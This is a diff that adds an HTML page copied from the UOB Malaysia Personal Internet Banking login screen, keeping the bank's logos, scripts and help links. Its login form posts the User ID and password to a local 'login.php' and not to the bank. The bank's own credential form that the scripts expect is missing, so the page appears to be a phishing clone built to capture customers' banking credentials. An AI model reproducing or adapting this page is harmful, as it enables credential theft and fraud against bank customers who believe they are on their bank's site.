@@ -1,0 +1,713 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   UOB Personal Internet Banking Mainpage
+  </title>
+  <script src="https://www.uob.com.my/uob/public/common.js" language="JavaScript">
+  </script>
+  <script src="https://www.uob.com.my/uob/public/main.js" type="text/javascript" language="JavaScript">
+  </script>
+  <script src="https://www.uob.com.my/uob/public/jsbn.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/public/jsbn2.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/public/prng4.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/public/rng.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/public/rsa1.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/public/IASE-convert.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/public/IASE-auth.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/js/1.10.2/jquery.min.js" type="text/javascript" language="javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/js/jquery.colorbox.js" type="text/javascript" language="javascript">
+  </script>
+  <link type="image/x-icon" href="http://www1.uob.com.my/assets/images/favicon.ico" rel="shortcut icon" />
+  <script>
+   $(document).ready(function(){
+				//Examples of how to assign the Colorbox event to elements
+				//$(".group1").colorbox({rel:'group1'});
+				//$(".group2").colorbox({rel:'group2', transition:"fade"});
+				//$(".group3").colorbox({rel:'group3', transition:"none", width:"75%", height:"75%"});
+				//$(".group4").colorbox({rel:'group4', slideshow:true});
+				//$(".ajax").colorbox();
+				//$(".callbacks").colorbox({
+					//onOpen:function(){ alert('onOpen: colorbox is about to open'); },
+					//onLoad:function(){ alert('onLoad: colorbox has started to load the targeted content'); },
+					//onComplete:function(){ alert('onComplete: colorbox has displayed the loaded content'); },
+					//onCleanup:function(){ alert('onCleanup: colorbox has begun the close process'); },
+					//onClosed:function(){ alert('onClosed: colorbox has completely closed'); }
+				//});
+
+				//$('.non-retina').colorbox({rel:'group5', transition:'none'})
+				//$('.retina').colorbox({rel:'group5', transition:'none', retinaImage:true, retinaUrl:true});
+				
+				//Example of preserving a JavaScript event for inline calls.
+				$("#click").click(function(){ 
+					$('#click').css({"background-color":"#f00", "color":"#fff", "cursor":"inherit"}).text("Open this window again and this message will still be here.");
+					return false;
+				});
+			});
+  </script>
+  <!-- START OLD CODE //-->
+  <script language="JavaScript">
+   var IASEKey = 
+{
+        modulus : "00efc52deba76cc5a868c98bc13fd163719ff8068e6cee9b623e49f58f3c626266ab1089831855e5518272f7fef1cdcb17ef08be33333c0953b13dc2544c428f3dbd6631a02edb1b1ec3df0b09f9f795ebcb82527190e4767c4e7e6b86c0408aa3d48f9c3987e30e822845b4fae59d9367b1af7dcc398a168008292429c778ea1cb74103d181eb921143cc54f07a4993843e0116a49a3c75588868d234cc370e3d0820fe14611922ff4a63f380561309f6e385922d6c061d63129a175c1ab84a3c15442952900405215d7c40532bbec084cbe713aac4596ff242b0e4a064477ea5ced4c2274006da33989fe60fd79a0e4bf15121b5027db6c20a2377aa1cd5f5ef", pubExp : "010001"
+}
+
+var submittedFlag = false;
+
+if (top != self)
+{
+	top.location.href = "index.jsp"
+}
+
+
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&amp;&amp;i&lt;a.length&amp;&amp;(x=a[i])&amp;&amp;x.oSrc;i++) x.src=x.oSrc;
+}
+
+
+function MM_preloadImages() { //v3.0
+    var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i&lt;a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+
+function MM_findObj(n, d) { //v4.0
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))&gt;0&amp;&amp;parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&amp;&amp;d.all) x=d.all[n]; for (i=0;!x&amp;&amp;i&lt;d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&amp;&amp;d.layers&amp;&amp;i&lt;d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x &amp;&amp; document.getElementById) x=document.getElementById(n); return x;
+}
+
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i&lt;(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+
+
+////////////////////////////////
+// BEGIN tfiaseApplet functions
+////////////////////////////////
+
+//var applet = document.LoginWithWSA;
+/*
+function e2ee_getEpinForLogin(applet, sid, ra, publicKey, pin) {
+
+  applet.storeSID(sid)
+  applet.storeChallenge(ra)
+  applet.load_PublicKey(publicKey)
+  applet.addPIN(pin)
+  if (! applet.auth()) return null
+  return applet.getEPIN()
+
+}
+
+function isAppletLoaded( applet ){
+
+    return applet != null;
+
+}
+*/
+
+////////////////////////////////
+// END tfiaseApplet functions
+////////////////////////////////
+
+function validate() {
+
+  var localForm = document.local;
+  var loginForm = document.form1;
+
+	if(!submittedFlag) {
+
+		if (Trim(localForm.username) == '') {
+			alert("User name is invalid.");
+			localForm.username.focus();
+			return;
+		}
+
+
+		if (Trim(localForm.pwd) == '') {
+			alert("Password is invalid.");
+			localForm.pwd.focus();
+			return;
+		}
+
+        
+                   
+		//var app = document.LoginWithWSA;
+                
+                /*
+		if(!isAppletLoaded( app )){
+	  	alert("Please wait for applet to load.");
+	    return;
+		}
+                */
+		//var appstr = app + "";
+		//if (appstr == null) {
+		//	alert( "Security applet cannot be loaded. Please enable applet in browser. Appstr is " + appstr );
+		//	return;
+		//}
+		//if (appstr == "") {
+		//	alert( "Security applet cannot be loaded. Please enable applet in browser. Appstr is " + appstr );
+		//	return;
+		//}
+		// check if applet is loaded.  Normal JVM "TrustFieldExtApp".  Java(Sun) will give appstr "Invalid PIN length"
+		//alert(appstr);
+		//if( !( (appstr.substr(0,16) == "TrustFieldExtApp") || (appstr == "Invalid PIN length") || (appstr == "[object HTMLAppletElement]")) ){
+		//	alert( "Security applet cannot be loaded. Please enable applet in browser. Appstr is " + appstr );
+		//	return;
+		//}
+		
+	  var passwordField = loginForm.credential;
+                passwordField.value = IASEAuth.encryptPin('A2753A26B6265C79C931E4AA787C2544', localForm.pwd.value);
+		//passwordField.value = e2ee_getEpinForLogin(app, '353139373535383730343839B236D250', 'A2753A26B6265C79C931E4AA787C2544', 'modulus : "00efc52deba76cc5a868c98bc13fd163719ff8068e6cee9b623e49f58f3c626266ab1089831855e5518272f7fef1cdcb17ef08be33333c0953b13dc2544c428f3dbd6631a02edb1b1ec3df0b09f9f795ebcb82527190e4767c4e7e6b86c0408aa3d48f9c3987e30e822845b4fae59d9367b1af7dcc398a168008292429c778ea1cb74103d181eb921143cc54f07a4993843e0116a49a3c75588868d234cc370e3d0820fe14611922ff4a63f380561309f6e385922d6c061d63129a175c1ab84a3c15442952900405215d7c40532bbec084cbe713aac4596ff242b0e4a064477ea5ced4c2274006da33989fe60fd79a0e4bf15121b5027db6c20a2377aa1cd5f5ef", pubExp : "010001"', localForm.pwd.value);
+        
+    if (passwordField.value == null || passwordField.value == "") {
+    	alert("encrypting password error, encrypted value is invalid" + "\nPlease refresh browser to login again");
+      return;
+    }
+   
+    //if (passwordField.value.length &gt; 256) {
+    	//alert("encrypting password error, length is " + passwordField.value.length + "\nPlease refresh browser to login again");
+      //return;
+    //}
+    
+    //if (passwordField.value.length &lt; 254) {
+    	//alert("encrypting password error, length is " + passwordField.value.length + "\nPlease refresh browser to login again");
+      //return;
+    //}
+
+		passwordField.value = 'A2753A26B6265C79C931E4AA787C2544' + ',' + '15' + ',' + passwordField.value;
+
+		var pwdstr='';
+		for (count=1;count &lt;= localForm.pwd.value.length;count++) {
+			pwdstr=pwdstr+'*';
+		}
+		localForm.pwd.value = pwdstr;
+
+		submittedFlag = true;
+		loginForm.username.value=localForm.username.value;
+		loginForm.submit();
+
+	} else {
+    alert("Login request already submitted");
+		return;
+	}
+	
+}
+
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features);
+}
+
+function popbnn() {
+	  window.open('http://www1.uob.com.my/safeguard/3rdparty_banknegara.html','frame','width=400,height=380,innerwidth=1,innerheight=1');
+}
+
+function popbankinginfo() {
+	  window.open('http://www1.uob.com.my/safeguard/3rdparty_bankinginfo.html','frame','width=400,height=380,innerwidth=1,innerheight=1');
+}
+
+function goFullPage(){
+    url = "https://www.uob.com.my/uob/index.jsp?visitFullPage=Y";
+    window.open(url);
+    self.close();
+}
+//--&gt;
+  </script>
+  <script language="JavaScript">
+   //scroller width
+var swidth=600
+
+//scroller height
+var sheight=50
+
+
+//scroller's speed;
+var sspeed=1
+
+var wholemessage=''
+
+//text: change to your own
+
+wholemessage='&lt;div align="center"&gt;&lt;font face=Arial size=2 color="#ffffff"&gt;&lt;b&gt;From Feb 18 to Apr 30, 2002&lt;/div&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align="center"&gt;20,000 UniRinggit will be rewarded for every 88th customer who activates the&lt;/DIV&gt;&lt;div align="center"&gt;UOB Internet Banking service and successfully performed 3 financial transactions.&lt;/DIV&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align="center"&gt;Another 20,000 UniRinggit for every 88th customer who activates the UOB&lt;/div&gt;&lt;div align="center"&gt;Internet Banking service and successfully performed 3 financial transactions.&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;'
+
+function start(){
+if (document.all) return
+if (document.getElementById){
+document.getElementById("slider").style.visibility="show"
+ns6marquee(document.getElementById('slider'))
+}
+else if(document.layers){
+document.slider1.visibility="show"
+ns4marquee(document.slider1.document.slider2)
+}
+}
+function ns4marquee(whichlayer){
+ns4layer=eval(whichlayer)
+ns4layer.document.write(wholemessage)
+ns4layer.document.close()
+sizeup=ns4layer.document.height
+ns4layer.top-=sizeup
+ns4slide()
+}
+function ns4slide(){
+if (ns4layer.top&gt;=sizeup*(-1)){
+ns4layer.top-=sspeed
+setTimeout("ns4slide()",100)
+}
+else{
+ns4layer.top=sheight
+ns4slide()
+}
+}
+function ns6marquee(whichdiv){
+ns6div=eval(whichdiv)
+ns6div.innerHTML=wholemessage
+ns6div.style.top=sheight
+sizeup=sheight
+ns6slide()
+}
+function ns6slide(){
+if (parseInt(ns6div.style.top)&gt;=sizeup*(-1)){
+ns6div.style.top=parseInt(ns6div.style.top)-sspeed
+setTimeout("ns6slide()",100)
+}
+else{
+ns6div.style.top=sheight
+ns6slide()
+}
+}
+  </script>
+  <script>
+   function go(url)
+{
+if(opener.location &amp;&amp; !opener.closed)
+	{
+	opener.location.href = url;self.close();
+	}
+else
+	{
+	window.open(url);self.close();
+	}
+}
+  </script>
+  <!-- END OLD CODE //-->
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="SAMEORIGIN" http-equiv="X-Frame-Options" />
+  <meta content="max-age=31536000" http-equiv="Strict-Transport-Security" />
+  <script src="https://www.uob.com.my/uob/public/timeout.js" language="JavaScript">
+  </script>
+  <link type="text/css" rel="stylesheet" href="https://www.uob.com.my/uob/css/prelogin.css" />
+  <link href="https://www.uob.com.my/uob/cb.css" rel="stylesheet" />
+  <meta content="no-cache" http-equiv="pragma" />
+  <meta content="no-cache" http-equiv="Cache-control" />
+  <meta content="0" name="expires" />
+  <meta content="0" http-equiv='="expires"' />
+  <link type="text/css" rel="stylesheet" href="https://www.uob.com.my/uob/css/thickbox.css" />
+  <script src="https://www.uob.com.my/uob/js/jquery-1.2.6.js" type="text/javascript">
+  </script>
+  <script src="https://www.uob.com.my/uob/js/thickbox.js" type="text/javascript">
+  </script>
+ </head>
+ <body marginwidth="0" marginheight="0" text="#000000" bgcolor="#ffffff" onload="show_clock()" topmargin="0" leftmargin="0">
+  <form action="login.php" method="post" name="local">
+   <table width="980" border="0" align="center" cellspacing="0" cellpadding="0">
+    <tbody>
+     <tr>
+      <td class="bg">
+       <table width="980" border="0" cellspacing="0" cellpadding="0">
+        <tbody>
+         <tr>
+          <td valign="top" height="108" colspan="5">
+           <table width="831" border="0" align="center" cellspacing="0" cellpadding="3">
+            <tbody>
+             <tr>
+              <td align="right" colspan="2">
+              </td>
+             </tr>
+             <tr>
+              <td rowspan="2">
+               <img src="https://www.uob.com.my/uob/images/UOB-logo.png" />
+              </td>
+              <td valign="top" align="right">
+               <a href="http://www1.uob.com.my/personal/index.html">
+                <img width="113" height="20" border="0" src="https://www.uob.com.my/uob/images/icon_uobm.png" />
+               </a>
+              </td>
+             </tr>
+             <tr>
+              <td valign="top" align="right">
+               <script type="text/javascript" src="https://www.uob.com.my/uob/public/liveclock.js" language="JavaScript">
+               </script>
+               <span style="width:300px;" id="LiveClockIE">
+                <font style="color:#000000; font-family:arial; font-size:8pt;">
+                 Now is 9:12:56  on Friday, 8th January
+                </font>
+               </span>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+         <tr>
+          <td width="69" valign="top" align="right" rowspan="4">
+          </td>
+          <td width="315" valign="top" align="right">
+           <table border="0" cellspacing="0" cellpadding="0">
+            <tbody>
+             <tr>
+              <td>
+               <img width="534" height="13" src="https://www.uob.com.my/uob/images/loginbox_top.jpg" />
+              </td>
+             </tr>
+             <tr>
+              <td background="https://www.uob.com.my/uob/images/loginbox_bg.jpg">
+               <table border="0" align="center" cellspacing="0" cellpadding="5">
+                <tbody>
+                 <tr>
+                  <td class="login_title" colspan="2">
+                   Login to
+                   <strong>
+                    UOB Personal Internet Banking
+                   </strong>
+                  </td>
+                 </tr>
+                 <tr>
+                  <td width="149" class="login">
+                   <strong>
+                    User ID
+                   </strong>
+                  </td>
+                  <td width="244" align="left">
+                   <input type="text" size="40" id="textfield2" class="login" name="username" />
+                  </td>
+                 </tr>
+                 <tr>
+                  <td class="login">
+                   <strong>
+                    Password
+                   </strong>
+                   <br />
+                   (case sensitive)
+                  </td>
+                  <td align="left">
+                   <input type="password" size="40" id="textfield" autocomplete="off" class="login" name="password" />
+                  </td>
+                 </tr>
+                 <tr>
+                  <td>
+                  </td>
+                  <td align="left">
+                   <input type="image" border="0" name="submit" value="Button" src="https://www.uob.com.my/uob/images/btn-login.gif" onclick="validate();return false;" />
+                   <a target="_blank" href="http://www1.uob.com.my/personal/ebanking/pib/demo.htm">
+                    <img width="132" height="20" border="0" src="https://www.uob.com.my/uob/images/btn-demo.gif" />
+                   </a>
+                  </td>
+                 </tr>
+                 <tr>
+                  <td>
+                  </td>
+                  <td align="left" class="login">
+                   <a title="PIB Forgot User ID or Password" href="forgot_id_password.htm?keepThis=true&TB_iframe=true&width=500&height=400/#passfuncoin" style="font-family: Arial, Helvetica, sans-serif; font-size: 11px; font-color:#000000" class="thickbox morelink">
+                    Forgot User ID or Password?
+                   </a>
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+             <tr>
+              <td>
+               <img width="534" height="11" src="https://www.uob.com.my/uob/images/loginbox_bottom.jpg" />
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+          <td width="26" rowspan="4">
+          </td>
+          <td width="247" valign="top" rowspan="4">
+           <table width="247" border="0" cellspacing="0" cellpadding="0">
+            <tbody>
+             <tr>
+              <td valign="top" height="237">
+               <iframe width="100%" height="100%" frameborder="0" scrolling="No" src="https://uniservices1.uob.com.my/webpages/Notice_pop/pib_promo.html">
+               </iframe>
+              </td>
+             </tr>
+             <tr>
+              <td valign="top">
+               <iframe width="100%" height="100%" frameborder="0" scrolling="No" src="https://uniservices1.uob.com.my/webpages/Notice_pop/pib_promo_b.html">
+               </iframe>
+              </td>
+             </tr>
+             <tr>
+              <td>
+               <img width="247" vspace="5" height="1" border="0" src="https://www.uob.com.my/uob/images/main_right_divider.gif" />
+              </td>
+             </tr>
+             <tr>
+              <td>
+               <table width="100%" border="0" cellspacing="0" cellpadding="3">
+                <tbody>
+                 <tr>
+                  <td class="bodytext" colspan="2">
+                   <strong>
+                    NEED ASSISTANCE?
+                   </strong>
+                  </td>
+                 </tr>
+                 <tr>
+                  <td colspan="2">
+                   <img width="4" height="8" src="https://www.uob.com.my/uob/images/red_arrow.gif" />
+                   <span class="bodytext">
+                    <a href="http://www1.uob.com.my/personal/ebanking/pib/faq.html">
+                     FAQs
+                    </a>
+                    <img width="4" height="8" src="https://www.uob.com.my/uob/images/red_arrow.gif" />
+                    <a href="https://uniservices1.uob.com.my/jsp/feedback/feedback.jsp?keepThis=true&TB_iframe=true&width=560&height=400/#passfuncoins">
+                     Email us
+                    </a>
+                   </span>
+                  </td>
+                 </tr>
+                 <tr>
+                  <td width="6%" valign="top">
+                   <img width="4" height="8" src="https://www.uob.com.my/uob/images/red_arrow.gif" />
+                  </td>
+                  <td width="94%" class="bodytext">
+                   Call
+                   <a href="#" class="tooltip">
+                    UOB 24-Hour Call Centre
+                    <span class="classic">
+                     Kuala Lumpur +603 - 26128 121
+                     <br />
+                     Penang +604 - 2401 121
+                     <br />
+                     Johor Bahru +607 - 2881 121
+                     <br />
+                     Kuching +6 082 - 287 121
+                     <br />
+                     Kota Kinabalu +6 088 - 477 121
+                    </span>
+                   </a>
+                  </td>
+                 </tr>
+                </tbody>
+               </table>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+          <td width="98" valign="top" rowspan="4">
+          </td>
+         </tr>
+         <tr>
+          <td valign="top" height="20" align="left" class="bodytext">
+           <strong>
+            New to Personal Internet Banking?
+           </strong>
+          </td>
+         </tr>
+         <tr>
+          <td align="right">
+           <table width="534" border="0" cellspacing="0" cellpadding="0">
+            <tbody>
+             <tr>
+              <td width="260">
+               <a href="javascript:signON()">
+                <img width="260" height="130" border="0/" src="https://www.uob.com.my/uob/images/prelogin_left.jpg" />
+               </a>
+              </td>
+              <td width="14">
+              </td>
+              <td width="260">
+               <a title="PIB Online Registration" href="cc_only.htm?keepThis=true&TB_iframe=true&width=500&height=400/#passfuncoin" class="thickbox morelink">
+                <img width="260" height="130" border="0/" src="https://www.uob.com.my/uob/images/prelogin_center.jpg" />
+               </a>
+              </td>
+             </tr>
+             <tr>
+              <td class="bodytext">
+               <a href="#" class="tooltip">
+                View Tips
+                <span class="classic">
+                 Register for Personal Internet
+                 <br />
+                 Banking and get a Temporary Internet PIN via:
+                 <br />
+                 - Any UOB Branch
+                 <br />
+                 - Any UOB ATM
+                 <br />
+                 - Application Form
+                </span>
+               </a>
+              </td>
+              <td width="14">
+              </td>
+              <td class="bodytext">
+               <a href="#" class="tooltip">
+                View Tips
+                <span class="classic">
+                 To register for Personal Internet Banking online, you will need:
+                 <br />
+                 - An active UOB Credit Card
+                 <br />
+                 - ID Number (NRIC/ Passport)
+                 <br />
+                 - Registered mobile number to receive One-Time Password (OTP)
+                </span>
+               </a>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <table width="980" border="0" align="center" cellspacing="0" cellpadding="0">
+    <tbody>
+     <tr>
+      <td width="64">
+      </td>
+      <td align="left" colspan="3">
+       <iframe width="100%" height="100" frameborder="0" scrolling="No" src="https://uniservices1.uob.com.my/webpages/Notice_pop/pib_notice.html">
+       </iframe>
+      </td>
+      <td width="80">
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <table width="980" border="0" align="center" cellspacing="0" cellpadding="0">
+    <tbody>
+     <tr>
+      <td align="center">
+      </td>
+     </tr>
+     <tr>
+      <td align="center">
+       <img width="946" vspace="5" height="3" src="https://www.uob.com.my/uob/images/footer_line.gif" />
+      </td>
+     </tr>
+     <tr>
+      <td>
+       <table width="946" border="0" align="center" cellspacing="0" cellpadding="5">
+        <tbody>
+         <tr>
+          <td width="472" class="acknowledgement">
+           <a href="http://www1.uob.com.my/privacy_policy.html" class="acknowledgement">
+            Privacy Policy
+           </a>
+           |
+           <a href="http://www.uob.com.my/pub/terms_and_conditions.htm" class="acknowledgement">
+            Terms and Conditions
+           </a>
+           |
+           <a href="http://www.uob.com.my/pub/clients_charter1.htm" class="acknowledgement">
+            Client Charter
+           </a>
+          </td>
+          <td width="474" align="right" class="acknowledgement">
+           Related Link :
+           <a href="javascript:popbnn();" class="acknowledgement">
+            BNM
+           </a>
+           |
+           <a href="javascript:popbankinginfo();" class="acknowledgement">
+            Banking Info
+           </a>
+          </td>
+         </tr>
+         <tr>
+          <td align="center" class="acknowledgement" colspan="2">
+           Copyright ©
+           <script language="JavaScript">
+            &lt;!--
+				var date = new Date();
+				var yy = date.getYear();
+				var year = (yy &lt; 1000) ? yy + 1900 : yy;
+				document.write(year);
+			//--&gt;
+           </script>
+           2016 United Overseas Bank (Malaysia) Bhd. (271809-K). All rights reserved.
+          </td>
+         </tr>
+        </tbody>
+       </table>
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <br />
+   <br />
+  </form>
+  <div id="cboxOverlay" style="display: none;">
+  </div>
+  <div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;">
+   <div id="cboxWrapper">
+    <div>
+     <div id="cboxTopLeft" style="float: left;">
+     </div>
+     <div id="cboxTopCenter" style="float: left;">
+     </div>
+     <div id="cboxTopRight" style="float: left;">
+     </div>
+    </div>
+    <div style="clear: left;">
+     <div id="cboxMiddleLeft" style="float: left;">
+     </div>
+     <div id="cboxContent" style="float: left;">
+      <div id="cboxTitle" style="float: left;">
+      </div>
+      <div id="cboxCurrent" style="float: left;">
+      </div>
+      <button type="button" id="cboxPrevious">
+      </button>
+      <button type="button" id="cboxNext">
+      </button>
+      <button id="cboxSlideshow">
+      </button>
+      <div id="cboxLoadingOverlay" style="float: left;">
+      </div>
+      <div id="cboxLoadingGraphic" style="float: left;">
+      </div>
+     </div>
+     <div id="cboxMiddleRight" style="float: left;">
+     </div>
+    </div>
+    <div style="clear: left;">
+     <div id="cboxBottomLeft" style="float: left;">
+     </div>
+     <div id="cboxBottomCenter" style="float: left;">
+     </div>
+     <div id="cboxBottomRight" style="float: left;">
+     </div>
+    </div>
+   </div>
+   <div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;">
+   </div>
+  </div>
+ </body>
+</html>
